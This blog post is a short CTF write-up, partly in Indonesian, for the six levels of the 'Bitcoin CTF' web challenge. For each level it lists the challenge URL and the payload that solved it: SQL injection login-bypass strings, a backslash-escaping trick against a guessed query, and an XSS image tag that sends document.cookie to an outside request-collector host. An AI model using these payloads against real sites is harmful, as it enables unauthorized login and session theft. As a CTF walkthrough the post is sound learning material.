---
private: 'false'
modified: 2017-03-23
layout: post
featured: false
published: true
comments: true
title: Writeup BitcointCTF
tags: sqlinjection
mathjax: false
imagefeature: /images/sqlinjection.jpg
description: Writeup BitcointCTF Challenge
category: Web Exploitation
chart: null
---


## Bitcoin CTF ($)

FIRST LEVEL: http://188.166.248.215/ 

prize: 1BtCctfV3MFXQ9zfLq8BkK53cpGdmkA2WL 

what: capture the flag \(CTF\) 

when: 1490349600 irc: \#bitcoinctf on freenode questions: @bitcoinctf or &lt;bitcoinctf \[at\] gmail.com&gt;



### Level 1

Soal : [http://188.166.248.215/](http://188.166.248.215/)

Injection : `1 or (1=1)#`

![](/images/level1-bitcoinctf.png)

### Level 2

Soal : [http://188.166.248.215/ce4dd79d-971b-40d3-a4e6-2041da6bcc64/](http://188.166.248.215/ce4dd79d-971b-40d3-a4e6-2041da6bcc64/)

Injection : `12' or '1'='1`

![](/images/level2-bitcoinctf.png)

### Level 3

Soal : [http://188.166.248.215/85998adb-2109-45d2-aec9-6e9d995e6d47/](http://188.166.248.215/85998adb-2109-45d2-aec9-6e9d995e6d47/)

Injection : `a' or 1=1#`

![](/images/level3-bitcoinctf.png)

### Level 4

Soal : [http://188.166.248.215/f3af878d-d7cd-47c0-b98e-074cf82d30d6/](http://188.166.248.215/f3af878d-d7cd-47c0-b98e-074cf82d30d6/)

Injection : `0 -- ' or '1'='1' -- " or "1"="1`

![](/images/level4-bitcoinctf.png)

### Level 5

Soal : [http://139.59.127.138/8eb7a8a1-2e0d-4ff7-a91b-8686ff229c28/](http://139.59.127.138/8eb7a8a1-2e0d-4ff7-a91b-8686ff229c28/)

Injection : `<img src=x onerror=this.src='http://requestb.in/191nnlq1?c='+document.cookie>`

![](/images/level5-bitcoinctf.png)

![](/images/level5-bitcoinctf-2.png)



### Level 6

Soal : [http://139.59.127.139/dbd41354-9645-4e87-bbb8-27f5db622a67/](http://139.59.127.139/dbd41354-9645-4e87-bbb8-27f5db622a67/)

  
setelah beberapa kali melakukan injeksi basic seperti `' OR 1=1#` pada kolom username dan password nampaknya tidak berjalan kemudian saya menebak query di backendnya seperti ini : `SELECT * from users where username='$user' and pasword = '$pass'`  


ketika kita coba kirim payload : `aaa\ & password= xxx `

query sebenarnya :` SELECT * from users where username='aaa\' and pasword = ' xxx'`



ketika kita coba kirim payload : `username = aaa\ & password= OR 1=1#`

query sebenarnya : `SELECT * from users where username='aaa\' and pasword = ' OR 1=1#'`

![](/images/level6-bitcoinctf.png)






